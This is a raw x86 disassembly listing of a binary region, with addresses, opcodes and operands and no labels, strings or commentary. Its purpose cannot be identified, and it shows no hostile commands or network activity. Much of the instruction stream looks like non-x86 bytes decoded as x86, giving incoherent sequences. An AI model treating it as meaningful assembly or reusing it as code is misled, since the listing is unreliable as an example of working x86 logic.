  403272:	add    BYTE PTR [ecx],al
  403274:	adc    esi,DWORD PTR [eax]
  403276:	or     al,BYTE PTR [eax]
  403278:	or     al,BYTE PTR [edx]
  40327a:	add    BYTE PTR [eax],al
  40327c:	adc    DWORD PTR [eax],eax
  40327e:	add    BYTE PTR [ecx],dl
  403280:	add    al,BYTE PTR [edx]
  403282:	sub    BYTE PTR [eax+eax*1+0x0],ch
  403286:	push   es
  403287:	sub    BYTE PTR [edx+0x28060000],al
  40328d:	mov    al,ds:0x280a0000
  403292:	and    al,BYTE PTR [eax]
  403294:	add    BYTE PTR [esi],al
  403296:	add    al,BYTE PTR [edx]
  403298:	sub    BYTE PTR [eax+0x0],ch
  40329b:	add    BYTE PTR [esi],al
  40329d:	adc    al,0xfe
  40329f:	push   es
  4032a0:	cmp    eax,0x73060000
  4032a5:	mov    eax,ds:0x140a0000
  4032aa:	sub    BYTE PTR [esi+0x0],bh
  4032ad:	add    BYTE PTR [esi],al
  4032af:	sub    BYTE PTR [ebp+0x28060000],al
  4032b5:	or     eax,DWORD PTR [eax]
  4032b7:	add    BYTE PTR [ebx],ch
  4032b9:	sub    BYTE PTR [eax+eax*1],ch
  4032bc:	add    BYTE PTR [esi],al
  4032be:	add    al,BYTE PTR [edx]
  4032c0:	sub    BYTE PTR [ebx],ch
  4032c2:	add    BYTE PTR [eax],al
  4032c4:	push   es
  4032c5:	sub    BYTE PTR [ebx+0x160a0000],ah
  4032cb:	inc    BYTE PTR [ecx]
  4032cd:	sub    BYTE PTR [esi],ah
  4032cf:	add    BYTE PTR [eax],al
  4032d1:	push   es
  4032d2:	add    al,BYTE PTR [edx]
  4032d4:	sub    BYTE PTR [ecx+0x0],ch
  4032d7:	add    BYTE PTR [esi],al
  4032d9:	adc    al,0xfe
  4032db:	push   es
  4032dc:	cmp    eax,0x73060000
  4032e1:	mov    eax,ds:0x140a0000
  4032e6:	sub    BYTE PTR [edx],bh
  4032e8:	add    BYTE PTR [eax],al
  4032ea:	or     ch,BYTE PTR [eax]
  4032ec:	jg     0x4032ee
  4032ee:	add    BYTE PTR [esi],al
  4032f0:	pop    ss
  4032f1:	lea    eax,[ecx]
  4032f3:	add    BYTE PTR [eax],al
  4032f5:	add    DWORD PTR [edx],ecx
  4032f7:	push   es
  4032f8:	push   ss
  4032f9:	sub    BYTE PTR [eax+0x0],ch
  4032fc:	add    BYTE PTR [esi],al
  4032fe:	mov    ds:0x3e2806,al
  403303:	add    BYTE PTR [edx],cl
  403305:	sub    BYTE PTR [esi+0x28060000],al
  40330b:	or     eax,DWORD PTR [eax]
  40330d:	add    BYTE PTR [ebx],ch
  40330f:	sub    BYTE PTR [esi],ch
  403311:	add    BYTE PTR [eax],al
  403313:	push   es
  403314:	add    al,BYTE PTR [edx]
  403316:	sub    BYTE PTR [ebp+0x0],ah
  403319:	add    BYTE PTR [esi],al
  40331b:	sub    BYTE PTR [edx],bh
  40331d:	add    BYTE PTR [eax],al
  40331f:	or     ch,BYTE PTR [eax]
  403321:	jnp    0x403323
  403323:	add    BYTE PTR [esi],al
  403325:	pop    ss
  403326:	lea    eax,[ecx]
  403328:	add    BYTE PTR [eax],al
  40332a:	add    DWORD PTR [ebx],ecx
  40332c:	pop    es
  40332d:	push   ss
  40332e:	sub    BYTE PTR [ebx+0x0],ch
  403331:	add    BYTE PTR [esi],al
  403333:	mov    ds:0x3e2807,al
  403338:	add    BYTE PTR [edx],cl
  40333a:	sub    BYTE PTR [eax+0x280a0000],ah
  403340:	sub    BYTE PTR [eax],al
  403342:	add    BYTE PTR [esi],al
  403344:	add    al,BYTE PTR [edx]
  403346:	sub    BYTE PTR [edi+0x0],ah
  403349:	add    BYTE PTR [esi],al
  40334b:	sub    BYTE PTR [ebp+0x0],bh
  40334e:	add    BYTE PTR [esi],al
  403350:	sub    BYTE PTR [eax+0x280a0000],ah
  403356:	and    al,0x0
  403358:	add    BYTE PTR [esi],al
  40335a:	add    al,BYTE PTR [edx]
  40335c:	sub    BYTE PTR [eax+eax*1+0x0],ah
  403360:	push   es
  403361:	adc    al,0xfe
  403363:	push   es
  403364:	cmp    eax,0x73060000
  403369:	mov    eax,ds:0x140a0000
  40336e:	sub    BYTE PTR [edx],bh
  403370:	add    BYTE PTR [eax],al
  403372:	or     ch,BYTE PTR [eax]
  403374:	jp     0x403376
  403376:	add    BYTE PTR [esi],al
  403378:	pop    ss
  403379:	lea    eax,[ecx]
  40337b:	add    BYTE PTR [eax],al
  40337d:	add    DWORD PTR [eax+ecx*1],ecx
  403380:	push   ss
  403381:	sub    BYTE PTR [ebx+0x0],ch
  403384:	add    BYTE PTR [esi],al
  403386:	mov    ds:0x3e2808,al
  40338b:	add    BYTE PTR [edx],cl
  40338d:	sub    BYTE PTR [ebx+0x28060000],al
  403393:	or     eax,DWORD PTR [eax]
  403395:	add    BYTE PTR [ebx],ch
  403397:	sub    BYTE PTR [edx],dh
  403399:	add    BYTE PTR [eax],al
  40339b:	push   es
  40339c:	add    al,BYTE PTR [edx]
  40339e:	sub    BYTE PTR [ecx],dh
  4033a0:	add    BYTE PTR [eax],al
  4033a2:	push   es
  4033a3:	adc    al,0xfe
  4033a5:	add    DWORD PTR [esi],edx
  4033a7:	inc    BYTE PTR [ecx]
  4033a9:	sub    BYTE PTR [edx],ch
  4033ab:	add    BYTE PTR [eax],al
  4033ad:	push   es
  4033ae:	add    al,BYTE PTR [edx]
  4033b0:	sub    BYTE PTR [ebx+0x0],ch
  4033b3:	add    BYTE PTR [esi],al
  4033b5:	adc    al,0xfe
  4033b7:	push   es
  4033b8:	add    BYTE PTR ds:[eax],al
  4033bb:	push   es
  4033bc:	jae    0x403362
  4033be:	add    BYTE PTR [eax],al
  4033c0:	or     dl,BYTE PTR [eax+ebp*1]
  4033c3:	cmp    al,BYTE PTR [eax]
  4033c5:	add    BYTE PTR [edx],cl
  4033c7:	sub    BYTE PTR [ecx+0x18060000],al
  4033cd:	lea    eax,[ecx]
  4033cf:	add    BYTE PTR [eax],al
  4033d1:	add    DWORD PTR ds:0x65281609,ecx
  4033d7:	add    BYTE PTR [eax],al
  4033d9:	push   es
  4033da:	mov    ds:0x64281709,al
  4033df:	add    BYTE PTR [eax],al
  4033e1:	push   es
  4033e2:	mov    ds:0x3e2809,al
  4033e7:	add    BYTE PTR [edx],cl
  4033e9:	sub    BYTE PTR [eax+0x28060000],cl
  4033ef:	or     al,0x0
  4033f1:	add    BYTE PTR [ebx],ch
  4033f3:	sub    BYTE PTR [eax],dh
  4033f5:	add    BYTE PTR [eax],al
  4033f7:	push   es
  4033f8:	add    al,BYTE PTR [edx]
  4033fa:	sub    BYTE PTR [edx+0x0],ch
  4033fd:	add    BYTE PTR [esi],al
  4033ff:	add    bh,dh
  403401:	push   es
  403402:	inc    eax
  403403:	add    BYTE PTR [eax],al
  403405:	push   es
  403406:	jae    0x4033a9
  403408:	add    BYTE PTR [eax],al
  40340a:	or     dl,BYTE PTR [eax+ebp*1]
  40340d:	cmp    al,BYTE PTR [eax]
  40340f:	add    BYTE PTR [edx],cl
  403411:	sub    BYTE PTR [eax+0x18060000],al
  403417:	lea    eax,[ecx]
  403419:	add    BYTE PTR [eax],al
  40341b:	add    DWORD PTR [ebx],edx
  40341d:	add    al,0x11
  40341f:	add    al,0x16
  403421:	sub    BYTE PTR [eax+0x0],ch
  403424:	add    BYTE PTR [esi],al
  403426:	mov    ds:0x28170411,al
  40342b:	add    BYTE PTR gs:[eax],al
  40342e:	push   es
  40342f:	mov    ds:0x3e280411,al
  403434:	add    BYTE PTR [eax],al
  403436:	or     ch,BYTE PTR [eax]
  403438:	xchg   DWORD PTR [eax],eax
  40343a:	add    BYTE PTR [esi],al
  40343c:	sub    BYTE PTR [ebx],cl
  40343e:	add    BYTE PTR [eax],al
  403440:	sub    ebp,DWORD PTR [eax]
  403442:	xor    al,0x0
  403444:	add    BYTE PTR [esi],al
  403446:	add    al,BYTE PTR [edx]
  403448:	sub    BYTE PTR [esi+0x0],ah
  40344b:	add    BYTE PTR [esi],al
  40344d:	add    bh,dh
  40344f:	push   es
  403450:	aas    
  403451:	add    BYTE PTR [eax],al
  403453:	push   es
  403454:	jae    0x4033fb
  403456:	add    BYTE PTR [eax],al
  403458:	or     dl,BYTE PTR [eax+ebp*1]
  40345b:	jl     0x40345d
  40345d:	add    BYTE PTR [esi],al
  40345f:	sub    BYTE PTR [eax+eax*1+0xd280600],al
  403466:	add    BYTE PTR [eax],al
  403468:	sub    ebp,DWORD PTR [eax]
  40346a:	add    BYTE PTR ss:[eax],al
  40346d:	push   es
  40346e:	add    ch,BYTE PTR [eax]
  403470:	xor    eax,0x2c060000
  403475:	or     BYTE PTR [edx],al
  403477:	pop    ss
  403478:	sub    BYTE PTR [eax],bh
  40347a:	add    BYTE PTR [eax],al
  40347c:	push   es
  40347d:	sub    al,BYTE PTR [edx]
  40347f:	sub    BYTE PTR [eax+eax*1],bh
  403482:	add    BYTE PTR [esi],al
  403484:	sub    BYTE PTR [esi],dh
  403486:	add    BYTE PTR [eax],al
  403488:	push   es
  403489:	sub    al,BYTE PTR [eax]
  40348b:	add    BYTE PTR [ebx],dl
  40348d:	xor    BYTE PTR [edx],al
  40348f:	add    BYTE PTR [edi],bl
  403491:	add    BYTE PTR [eax],al
  403493:	add    BYTE PTR [edx],dl
  403495:	add    BYTE PTR [eax],al
  403497:	adc    DWORD PTR [ebx-0x5a],esi
  40349a:	add    BYTE PTR [eax],al
  40349c:	or     cl,BYTE PTR [edx]
  40349e:	push   es
  40349f:	sub    BYTE PTR [edi+0x6f0a0000],ah
  4034a5:	push   0x0
  4034a7:	add    BYTE PTR [edx],cl
  4034a9:	push   es
  4034aa:	pop    ss
  4034ab:	jae    0x403455
  4034ad:	add    BYTE PTR [eax],al
  4034af:	or     ch,BYTE PTR [edi-0x57]
  4034b2:	add    BYTE PTR [eax],al
  4034b4:	or     al,BYTE PTR [esi]
  4034b6:	sub    dh,BYTE PTR [esi]
  4034b8:	add    eax,DWORD PTR [edx]
  4034ba:	push   ecx
  4034bb:	add    ch,BYTE PTR [eax]
  4034bd:	mov    ds:0x160a0000,eax
  4034c2:	inc    BYTE PTR [ecx]
  4034c4:	sub    al,BYTE PTR [eax]
  4034c6:	add    BYTE PTR [eax],al
  4034c8:	adc    esi,DWORD PTR [eax]
  4034ca:	add    al,BYTE PTR [eax]
  4034cc:	sub    eax,DWORD PTR [eax]
  4034ce:	add    BYTE PTR [eax],al
  4034d0:	adc    eax,DWORD PTR [eax]
  4034d2:	add    BYTE PTR [ecx],dl
  4034d4:	add    edx,DWORD PTR [ecx+edx*2]
  4034d7:	add    ch,BYTE PTR [eax]
  4034d9:	stos   BYTE PTR es:[edi],al
  4034da:	add    BYTE PTR [eax],al
  4034dc:	or     ch,BYTE PTR [edx+eax*1]
  4034df:	push   ss
  4034e0:	sub    al,BYTE PTR [edx]
  4034e2:	adc    al,BYTE PTR [eax]
  4034e4:	sub    BYTE PTR [ebx+0x2c0a0000],ch
  4034ea:	or     al,BYTE PTR [ebx]
  4034ec:	push   es
  4034ed:	jae    0x403533
  4034ef:	add    BYTE PTR [eax],al
  4034f1:	push   es
  4034f2:	push   ecx
  4034f3:	sub    ecx,DWORD PTR [eax]
  4034f5:	add    eax,DWORD PTR [edx]
  4034f7:	jae    0x40353e
  4034f9:	add    BYTE PTR [eax],al
  4034fb:	push   es
  4034fc:	push   ecx
  4034fd:	pop    ss
  4034fe:	sub    al,BYTE PTR [eax]
  403500:	adc    esi,DWORD PTR [eax]
  403502:	add    al,BYTE PTR [eax]
  403504:	and    al,0x0
  403506:	add    BYTE PTR [eax],al
  403508:	adc    al,BYTE PTR [eax]
  40350a:	add    BYTE PTR [ecx],dl
  40350c:	add    al,0x14
  40350e:	push   ecx
  40350f:	add    ebp,DWORD PTR [eax]
  403511:	push   eax
  403512:	add    BYTE PTR [eax],al
  403514:	or     ch,BYTE PTR [edi+edx*1]
  403517:	add    ebp,DWORD PTR [eax]
  403519:	push   cs
  40351a:	add    BYTE PTR [eax],al
  40351c:	sub    ecx,DWORD PTR [edx]
  40351e:	push   es
  40351f:	sub    al,0xd
  403521:	push   es
  403522:	outs   dx,DWORD PTR ds:[esi]
  403523:	lods   eax,DWORD PTR ds:[esi]
  403524:	add    BYTE PTR [eax],al
  403526:	or     ch,BYTE PTR [eax*1+0x17510604]
  40352d:	sub    dl,BYTE PTR [esi]
  40352f:	sub    bl,BYTE PTR [ebx]
  403531:	xor    BYTE PTR [esi],al
  403533:	add    BYTE PTR [ecx+0x0],al
  403536:	add    BYTE PTR [eax],al
  403538:	adc    al,0x0
  40353a:	add    BYTE PTR [ecx],dl
  40353c:	add    al,0x14
  40353e:	push   ecx
  40353f:	add    ebp,DWORD PTR [eax]
  403541:	cmp    al,BYTE PTR [eax]
  403543:	add    BYTE PTR [esi],al
  403545:	sub    eax,0x42a1602
  40354a:	add    ebp,DWORD PTR [eax]
  40354c:	scas   al,BYTE PTR es:[edi]
  40354d:	add    BYTE PTR [eax],al
  40354f:	or     dl,BYTE PTR [ecx-0x22]
  403552:	or     al,BYTE PTR es:[esi]
  403555:	sub    BYTE PTR [edx],bh
  403557:	add    BYTE PTR [eax],al
  403559:	or     dh,BYTE PTR [edx+0xf]
  40355c:	add    eax,DWORD PTR [eax]
  40355e:	jo     0x403577
  403560:	lea    eax,[ecx]
  403562:	add    BYTE PTR [eax],al
  403564:	add    DWORD PTR [eax+ecx*1],ecx
  403567:	push   ss
  403568:	add    esp,DWORD PTR [edx+0x3e2808]
  40356e:	add    BYTE PTR [edx],cl
  403570:	sub    BYTE PTR [ebx],bl
  403572:	add    BYTE PTR [eax],al
  403574:	or     dl,BYTE PTR [esi]
  403576:	or     ebx,esi
  403578:	add    dl,BYTE PTR [edi]
  40357a:	sub    al,BYTE PTR [edi]
  40357c:	sub    al,BYTE PTR [eax]
  40357e:	add    BYTE PTR [eax],al
  403580:	add    DWORD PTR [eax],edx
  403582:	add    BYTE PTR [eax],al
  403584:	add    BYTE PTR [eax],al
  403586:	or     eax,0x170a00
  40358b:	xor    DWORD PTR es:[eax],eax
  40358e:	add    BYTE PTR [ecx],al
  403590:	add    esi,DWORD PTR [eax]
  403592:	add    al,BYTE PTR [eax]
  403594:	jno    0x403596
  403596:	add    BYTE PTR [eax],al
  403598:	add    BYTE PTR [eax],al
  40359a:	add    BYTE PTR [eax],al
  40359c:	add    ch,BYTE PTR [eax]
  40359e:	inc    ebx
  40359f:	add    BYTE PTR [eax],al
  4035a1:	push   es
  4035a2:	pop    ss
  4035a3:	xor    esp,DWORD PTR [esi+0x2]
  4035a6:	sub    BYTE PTR ds:0x2d060000,bl
  4035ac:	pop    esi
  4035ad:	add    ch,BYTE PTR [eax]
  4035af:	pop    ds
  4035b0:	add    BYTE PTR [eax],al
  4035b2:	push   es
  4035b3:	sub    eax,0x21280256
  4035b8:	add    BYTE PTR [eax],al
  4035ba:	push   es
  4035bb:	sub    al,0x6
  4035bd:	jae    0x4035ce
  4035bf:	add    BYTE PTR [eax],al
  4035c1:	push   es
  4035c2:	sub    al,BYTE PTR [edx]
  4035c4:	sub    BYTE PTR [ebx],ah
  4035c6:	add    BYTE PTR [eax],al
  4035c8:	push   es
  4035c9:	sub    al,0x6
  4035cb:	jae    0x4035d7
  4035cd:	add    BYTE PTR [eax],al
  4035cf:	push   es
  4035d0:	sub    al,BYTE PTR [edx]
  4035d2:	sub    BYTE PTR [edi],ah
  4035d4:	add    BYTE PTR [eax],al
  4035d6:	push   es
  4035d7:	sub    al,0x6
  4035d9:	jae    0x4035e3
  4035db:	add    BYTE PTR [eax],al
  4035dd:	push   es
  4035de:	sub    al,BYTE PTR [edx]
  4035e0:	sub    BYTE PTR ds:0x2c060000,ah
  4035e6:	push   es
  4035e7:	jae    0x4035f5
  4035e9:	add    BYTE PTR [eax],al
  4035eb:	push   es
  4035ec:	sub    al,BYTE PTR [edx]
  4035ee:	sub    BYTE PTR [ecx],ch
  4035f0:	add    BYTE PTR [eax],al
  4035f2:	push   es
  4035f3:	sub    al,0x6
  4035f5:	jae    0x40360b
  4035f7:	add    BYTE PTR [eax],al
  4035f9:	push   es
  4035fa:	sub    dh,BYTE PTR [edx+0x53]
  4035fd:	add    eax,DWORD PTR [eax]
  4035ff:	jo     0x403674
  403601:	scas   eax,DWORD PTR es:[edi]
  403602:	add    BYTE PTR [eax],al
  403604:	or     ch,BYTE PTR [eax]
  403606:	mov    al,0x0
  403608:	add    BYTE PTR [edx],cl
  40360a:	es adc al,0x2a
  40360d:	add    BYTE PTR [eax],al
  40360f:	add    BYTE PTR [ebx],dl
  403611:	xor    BYTE PTR [edx],al
  403613:	add    BYTE PTR [eax+eax*1+0x0],cl
  403617:	add    BYTE PTR ds:0x16110000,dl
  40361d:	or     al,BYTE PTR [edx]
  40361f:	sub    BYTE PTR [ebx+0x0],al
  403622:	add    BYTE PTR [esi],al
  403624:	or     eax,DWORD PTR [edi]
  403626:	sub    eax,0x60170606
  40362b:	or     ch,BYTE PTR [ebx]
  40362d:	or     BYTE PTR [edi],al
  40362f:	pop    ss
  403630:	xor    DWORD PTR [esi+eax*1],eax
  403633:	sbb    BYTE PTR [eax+0xa],ah
  403636:	add    ch,BYTE PTR [eax]
  403638:	sub    eax,0x2c060000
  40363d:	or     al,0x2
  40363f:	sub    BYTE PTR ds:0x2d060000,ah
  403645:	add    al,0x6
  403647:	sbb    ah,BYTE PTR [eax+0xa]
  40364a:	add    ch,BYTE PTR [eax]
  40364c:	das    
  40364d:	add    BYTE PTR [eax],al
  40364f:	push   es
  403650:	sub    al,0x14
  403652:	add    ch,BYTE PTR [eax]
  403654:	daa    
  403655:	add    BYTE PTR [eax],al
  403657:	push   es
  403658:	sub    eax,0x2928020c
  40365d:	add    BYTE PTR [eax],al
  40365f:	push   es
  403660:	sub    eax,0x601e0604
  403665:	or     al,BYTE PTR [esi]
  403667:	sub    dl,BYTE PTR [ebx]
  403669:	xor    BYTE PTR [edx],al
  40366b:	add    BYTE PTR [edi+0x0],cl
  40366e:	add    BYTE PTR [eax],al
  403670:	adc    eax,DWORD PTR [eax]
  403672:	add    BYTE PTR [ecx],dl
  403674:	push   ss
  403675:	or     al,BYTE PTR [esi]
  403677:	add    ch,BYTE PTR [eax]
  403679:	and    DWORD PTR [eax],eax
  40367b:	add    BYTE PTR [esi],al
  40367d:	sub    eax,0x12b1603
  403682:	pop    ss
  403683:	pop    eax
  403684:	or     al,BYTE PTR [esi]
  403686:	add    ch,BYTE PTR [eax]
  403688:	and    eax,DWORD PTR [eax]
  40368a:	add    BYTE PTR [esi],al
  40368c:	sub    eax,0x12b1603
  403691:	pop    ss
  403692:	pop    eax
  403693:	or     al,BYTE PTR [esi]
  403695:	add    ch,BYTE PTR [eax]
  403697:	daa    
  403698:	add    BYTE PTR [eax],al
  40369a:	push   es
  40369b:	sub    eax,0x12b1603
  4036a0:	pop    ss
  4036a1:	pop    eax
  4036a2:	or     al,BYTE PTR [esi]
  4036a4:	add    ch,BYTE PTR [eax]
  4036a6:	and    eax,0x2d060000
  4036ab:	add    edx,DWORD PTR [esi]
  4036ad:	sub    eax,DWORD PTR [ecx]
  4036af:	pop    ss
  4036b0:	pop    eax
  4036b1:	or     al,BYTE PTR [esi]
  4036b3:	add    ch,BYTE PTR [eax]
  4036b5:	sub    DWORD PTR [eax],eax
  4036b7:	add    BYTE PTR [esi],al
  4036b9:	sub    eax,0x12b1603
  4036be:	pop    ss
  4036bf:	pop    eax
  4036c0:	or     al,BYTE PTR [esi]
  4036c2:	sub    bh,BYTE PTR [edx+0x2]
  4036c5:	sub    BYTE PTR [edx+0x0],cl
  4036c8:	add    BYTE PTR [edx],cl
  4036ca:	add    al,BYTE PTR [ebx]
  4036cc:	jae    0x40367f
  4036ce:	add    BYTE PTR [eax],al
  4036d0:	or     bh,BYTE PTR [ebp+0x2f]
  4036d3:	add    BYTE PTR [eax],al
  4036d5:	add    al,0x2
  4036d7:	jle    0x4036f5
  4036d9:	add    BYTE PTR [eax],al
  4036db:	or     bh,BYTE PTR [ebp+0x30]
  4036de:	add    BYTE PTR [eax],al
  4036e0:	add    al,0x2a
  4036e2:	push   0x2
  4036e4:	sub    BYTE PTR [edx+0x0],cl
  4036e7:	add    BYTE PTR [edx],cl
  4036e9:	add    bh,BYTE PTR [edi+ebp*1+0x0]
  4036ed:	add    BYTE PTR [esi+edi*8],al
  4036f0:	adc    eax,0x1b000003
  4036f5:	add    al,BYTE PTR [ebx]
  4036f7:	jge    0x403729
  4036f9:	add    BYTE PTR [eax],al
  4036fb:	add    al,0x2a
  4036fd:	push   ds
  4036fe:	add    bh,BYTE PTR [ebx+0x2f]
  403701:	add    BYTE PTR [eax],al
  403703:	add    al,0x2a
  403705:	push   ds
  403706:	add    bh,BYTE PTR [ebx+0x30]
  403709:	add    BYTE PTR [eax],al
  40370b:	add    al,0x2a
  40370d:	add    BYTE PTR [eax],al
  40370f:	add    BYTE PTR [ebx],bl
  403711:	xor    BYTE PTR [ecx],al
  403713:	add    BYTE PTR [edx],dl
  403715:	add    BYTE PTR [eax],al
  403717:	add    BYTE PTR [esi],dl
  403719:	add    BYTE PTR [eax],al
  40371b:	adc    DWORD PTR [edx],eax
  40371d:	sub    BYTE PTR [ecx+0x0],cl
  403720:	add    BYTE PTR [esi],al
  403722:	es pop ss
  403724:	or     bl,dh
  403726:	add    eax,0xde0a1626
  40372b:	add    BYTE PTR [esi],al
  40372d:	sub    al,BYTE PTR [eax]
  40372f:	add    BYTE PTR [ecx],al
  403731:	adc    BYTE PTR [eax],al
  403733:	add    BYTE PTR [eax],al
  403735:	add    BYTE PTR [eax],al
  403737:	add    BYTE PTR [ebx],cl
  403739:	or     eax,DWORD PTR [eax]
  40373b:	add    eax,0x1000001
  403740:	adc    esi,DWORD PTR [eax]
  403742:	add    eax,0x9e00
  403747:	add    BYTE PTR [edi],dl
  403749:	add    BYTE PTR [eax],al
  40374b:	adc    DWORD PTR [edx],eax
  40374d:	sub    BYTE PTR [esi+0x0],al
  403750:	add    BYTE PTR [esi],al
  403752:	or     edx,DWORD PTR [edx]
  403754:	add    DWORD PTR [eax],ebp
  403756:	pop    eax
  403757:	add    BYTE PTR [eax],al
  403759:	or     ch,BYTE PTR [esp+edx*1]
  40375c:	add    ch,BYTE PTR [eax]
  40375e:	inc    esi
  40375f:	add    BYTE PTR [eax],al
  403761:	push   es
  403762:	or     al,0x12
  403764:	add    ch,BYTE PTR [eax]
  403766:	mov    dl,0x0
  403768:	add    BYTE PTR [edx],cl
  40376a:	sub    BYTE PTR [ebx+0x2a0a0000],dh
  403770:	add    ch,BYTE PTR [eax]
  403772:	inc    edi
  403773:	add    BYTE PTR [eax],al
  403775:	push   es
  403776:	sub    BYTE PTR [eax+eax*1+0x60a0a00],dh
  40377d:	sub    al,0x3b
  40377f:	push   es
  403780:	mov    gs,WORD PTR [ecx+0x17]
  403783:	xor    eax,DWORD PTR [esi+eax*1]
  403786:	push   ss
  403787:	call   0x3117:0x698e062a
  40378e:	sub    ebp,DWORD PTR [eax]
  403790:	cmp    al,BYTE PTR [eax]
  403792:	add    BYTE PTR [edx],cl
  403794:	jb     0x403813
  403796:	add    eax,DWORD PTR [eax]
  403798:	jo     0x4037b1
  40379a:	lea    eax,[ecx]
  40379c:	add    BYTE PTR [eax],al
  40379e:	add    DWORD PTR ds:0x7b021609,ecx
  4037a4:	xor    BYTE PTR [eax],al
  4037a6:	add    BYTE PTR [edx+eiz*4],al
  4037a9:	or     DWORD PTR [eax],ebp
  4037ab:	add    BYTE PTR ds:[eax],al
  4037ae:	or     dh,BYTE PTR [ebx-0x51]
  4037b1:	add    BYTE PTR [eax],al
  4037b3:	or     ch,BYTE PTR [eax]
  4037b5:	mov    al,0x0
  4037b7:	add    BYTE PTR [edx],cl
  4037b9:	sub    BYTE PTR es:[edx],bh
  4037bc:	add    BYTE PTR [eax],al
  4037be:	or     dh,BYTE PTR [edx-0x2f]
  4037c1:	add    eax,DWORD PTR [eax]
  4037c3:	jo     0x4037dc
  4037c5:	lea    eax,[ecx]
  4037c7:	add    BYTE PTR [eax],al
  4037c9:	add    DWORD PTR [ebx],edx
  4037cb:	add    al,0x11
  4037cd:	add    al,0x16
  4037cf:	add    bh,BYTE PTR [ebx+0x30]
  4037d2:	add    BYTE PTR [eax],al
  4037d4:	add    al,0xa2
  4037d6:	adc    DWORD PTR [eax+ebp*1],eax
  4037d9:	add    BYTE PTR ds:[eax],al
  4037dc:	or     dh,BYTE PTR [ebx-0x51]
  4037df:	add    BYTE PTR [eax],al
  4037e1:	or     ch,BYTE PTR [eax]
  4037e3:	mov    al,0x0
  4037e5:	add    BYTE PTR [edx],cl
  4037e7:	es adc al,0x2a
  4037ea:	add    ch,BYTE PTR ss:[eax]
  4037ed:	dec    edx
  4037ee:	add    BYTE PTR [eax],al
  4037f0:	or     dl,BYTE PTR [edi]
  4037f2:	sub    BYTE PTR [ebp+0x2a0a0000],dh
  4037f8:	add    ch,BYTE PTR ss:[eax]
  4037fb:	dec    edx
  4037fc:	add    BYTE PTR [eax],al
  4037fe:	or     al,BYTE PTR [ebx]
  403800:	sub    BYTE PTR [ebp+0x2a0a0000],dh
  403806:	push   ds
  403807:	add    bh,BYTE PTR [ebx+0x31]
  40380a:	add    BYTE PTR [eax],al
  40380c:	add    al,0x2a
  40380e:	and    al,BYTE PTR [edx]
  403810:	add    edi,DWORD PTR [ebp+0x31]
  403813:	add    BYTE PTR [eax],al
  403815:	add    al,0x2a
  403817:	xchg   esi,eax
  403818:	sub    BYTE PTR [esi+0x2c0a0000],dh
  40381e:	or     al,0x2
  403820:	sub    BYTE PTR [edi+0x280a0000],dh
  403826:	dec    ebp
  403827:	add    BYTE PTR [eax],al
  403829:	push   es
  40382a:	sub    dl,BYTE PTR [esi]
  40382c:	jb     0x403841
  40382e:	add    al,0x0
  403830:	jo     0x4038a5
  403832:	mov    eax,0x280a0000
  403837:	mov    al,0x0
  403839:	add    BYTE PTR [edx],cl
  40383b:	sub    al,BYTE PTR es:[eax]
  40383e:	add    BYTE PTR [eax],al
  403840:	or     esi,DWORD PTR [eax]
  403842:	add    al,BYTE PTR [eax]
  403844:	inc    edi
  403845:	add    BYTE PTR [eax],al
  403847:	add    BYTE PTR [eax],al
  403849:	add    BYTE PTR [eax],al
  40384b:	add    BYTE PTR [edx],al
  40384d:	sub    BYTE PTR [eax+eax*1+0x0],cl
  403851:	push   es
  403852:	sub    al,0x2e
  403854:	add    ch,BYTE PTR [eax]
  403856:	dec    esp
  403857:	add    BYTE PTR [eax],al
  403859:	push   es
  40385a:	outs   dx,DWORD PTR ds:[esi]
  40385b:	mov    ecx,0x180a0000
  403860:	xor    esp,DWORD PTR [eax]
  403862:	add    ch,BYTE PTR [eax]
  403864:	dec    esp
  403865:	add    BYTE PTR [eax],al
  403867:	push   es
  403868:	outs   dx,DWORD PTR ds:[esi]
  403869:	dec    ecx
  40386a:	add    BYTE PTR [eax],al
  40386c:	or     bl,dh
  40386e:	and    eax,DWORD PTR [edx]
  403870:	sub    BYTE PTR [eax+eax*1+0x0],cl
  403874:	push   es
  403875:	outs   dx,DWORD PTR ds:[esi]
  403876:	mov    edx,0x20a0000
  40387b:	adc    al,0x28
  40387d:	dec    ebp
  40387e:	add    BYTE PTR [eax],al
  403880:	push   es
  403881:	fdiv   QWORD PTR [edx+0x5b]
  403884:	add    al,0x0
  403886:	jo     0x4038fb
  403888:	scas   eax,DWORD PTR es:[edi]
  403889:	add    BYTE PTR [eax],al
  40388b:	or     ch,BYTE PTR [eax]
  40388d:	mov    al,0x0
  40388f:	add    BYTE PTR [edx],cl
  403891:	sub    al,BYTE PTR es:[eax]
  403894:	add    DWORD PTR [eax],edx
  403896:	add    BYTE PTR [eax],al
  403898:	add    al,BYTE PTR [eax]
  40389a:	push   ss
  40389b:	add    BYTE PTR ds:0x130023,cl
  4038a1:	add    BYTE PTR [eax],al
  4038a3:	add    BYTE PTR [ebx],bl
  4038a5:	xor    BYTE PTR [edx],al
  4038a7:	add    BYTE PTR [ecx],ah
  4038a9:	add    BYTE PTR [eax],al
  4038ab:	add    BYTE PTR [esi],dl
  4038ad:	add    BYTE PTR [eax],al
  4038af:	adc    DWORD PTR [edx],eax
  4038b1:	sub    BYTE PTR [edi+0x280a0000],dh
  4038b7:	dec    ebp
  4038b8:	add    BYTE PTR [eax],al
  4038ba:	push   es
  4038bb:	fiadd  WORD PTR ds:0xde0a1626
  4038c1:	or     eax,0x4c2802
  4038c6:	add    BYTE PTR [esi],al
  4038c8:	adc    al,0xfe
  4038ca:	add    DWORD PTR [esi],edx
  4038cc:	inc    BYTE PTR [ecx]
  4038ce:	sub    al,BYTE PTR [esi]
  4038d0:	sub    al,BYTE PTR [eax]
  4038d2:	add    BYTE PTR [eax],al
  4038d4:	add    DWORD PTR [eax],edx
  4038d6:	add    BYTE PTR [eax],al
  4038d8:	add    BYTE PTR [eax],al
  4038da:	add    BYTE PTR [eax],al
  4038dc:	or     eax,0x2d05000d
  4038e1:	add    BYTE PTR [eax],al
  4038e3:	add    DWORD PTR [ebx],ebx
  4038e5:	xor    BYTE PTR [esi],al
  4038e7:	add    BYTE PTR [esi],bl
  4038e9:	add    DWORD PTR [eax],eax
  4038eb:	add    BYTE PTR [eax],bl
  4038ed:	add    BYTE PTR [eax],al
  4038ef:	adc    DWORD PTR [edx],eax
  4038f1:	sub    BYTE PTR [eax+eax*1+0x0],cl
  4038f5:	push   es
  4038f6:	sub    al,0xe
  4038f8:	add    ch,BYTE PTR [eax]
  4038fa:	dec    esp
  4038fb:	add    BYTE PTR [eax],al
  4038fd:	push   es
  4038fe:	outs   dx,DWORD PTR ds:[esi]
